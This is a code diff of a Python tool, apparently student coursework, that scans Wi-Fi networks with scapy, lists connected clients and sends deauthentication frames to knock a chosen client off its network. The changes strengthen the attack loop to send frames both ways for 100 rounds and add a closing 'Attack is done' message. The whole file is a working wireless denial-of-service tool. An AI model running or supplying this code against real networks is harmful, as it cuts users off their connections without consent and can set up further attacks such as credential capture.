@@ -1,5 +1,3 @@
-from time import sleep
-
 import netifaces
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap
@@ -36,7 +34,11 @@ class Network:
         return self.mac
 
 
-# need to pip install netiface!!!!!
+'''
+scans all interfaces 
+'''
+
+
 def iface_list():
     if_list = netifaces.interfaces()
     return if_list
@@ -81,11 +83,22 @@ def packet_handler(pkt):
                 net.add_user(sn)
 
 
+'''
+sniffs for packets using selected interface
+'''
+
+
 def start_sniffer(interface):
     os.system("clear")
     for channel in range(1, 13):
+        print("\U0001F634")
         os.system("iwconfig %s channel %d" % (interface, channel))
-        sniff(iface=interface, timeout=2, prn=packet_handler)  # change timeout to 5 before subbmiting
+        sniff(iface=interface, timeout=5, prn=packet_handler)
+
+
+'''
+sends deauth packets to selected user on selected network
+'''
 
 
 def perform_deauth(router, client, iface):
@@ -95,9 +108,10 @@ def perform_deauth(router, client, iface):
     print('Sending Deauth to ' + client + ' from ' + router)
 
     try:
-        for i in range(20):
-            sendp(pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=0)
-            #sendp(cli_to_ap_pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=0)
+        for i in range(100):
+            sendp(pckt, inter=0.1, count=1, loop=0, iface=iface, verbose=0)
+            sendp(cli_to_ap_pckt, inter=0.1, count=1, loop=0, iface=iface, verbose=0)
+            print("\U0001F608")
 
     except Exception as e:
         print(f"error: {e}")
@@ -110,7 +124,7 @@ if __name__ == '__main__':
     print("Available interfaces:")
     if_list = iface_list()
     for i in range(0, len(if_list)):
-        print(i+1, if_list[i])
+        print(i + 1, if_list[i])
     flag = True
     while (flag):
         user_choice = input("Please pick an interface:\n ")
@@ -119,7 +133,7 @@ if __name__ == '__main__':
                                 "listed numbers")
 
         print(user_choice)
-        user_iface = if_list[int(user_choice)-1]
+        user_iface = if_list[int(user_choice) - 1]
 
         print('Setting interface into monitor mode...\n')
         try:
@@ -139,7 +153,8 @@ if __name__ == '__main__':
     # let user pick network - check number is valid
     user_choice = input("Please pick a network: \n")
     while int(user_choice) < 1 or int(user_choice) > len(network_list):
-        user_choice = input("Network has to be in the range seen above\n Please pick an network from the listed numbers")
+        user_choice = input(
+            "Network has to be in the range seen above\n Please pick an network from the listed numbers")
 
     user_key = list(network_list)[int(user_choice) - 1]
     user_network = network_list.get(user_key)
@@ -160,3 +175,4 @@ if __name__ == '__main__':
 
     # deauth
     perform_deauth(user_network.get_mac(), client_to_attack, user_iface)
+    print("Attack is done. goodbye!")
